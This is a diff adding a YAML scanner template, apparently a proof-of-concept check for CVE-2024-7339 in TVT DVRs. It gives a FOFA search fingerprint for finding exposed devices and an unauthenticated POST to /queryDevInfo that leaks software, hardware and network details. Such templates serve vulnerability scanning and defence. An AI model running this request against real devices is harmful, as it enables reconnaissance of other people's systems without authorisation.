@@ -1,0 +1,19 @@
+id: poc-yaml-tvt-dvr-sensitive-device-Information-disclosure
+info:
+  name: TVT DVR接口queryDevInfo 信息泄漏(CVE-2024-7339)
+  severity: medium
+  tags:
+  - 信息泄露
+  - CVE-2024-7339
+  finger: TVT DVR
+  fofa: v\=20180615.01\" src\=\"js/lib/require.js\" type\=\"text/javascript
+requests:
+- method: POST
+  path: /queryDevInfo
+  data: <?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-9000"
+    clientType="WEB"/>
+  expression: "status_code == 200 && \ncontains(body,\"softwareVersion\") &&\ncontains(body,\"\
+    eth0\") &&\ncontains(body,\"hardwareVersion\") &&\ncontains(headers,\"text/xml\"\
+    )\n"
+variables: {}
+transport: http
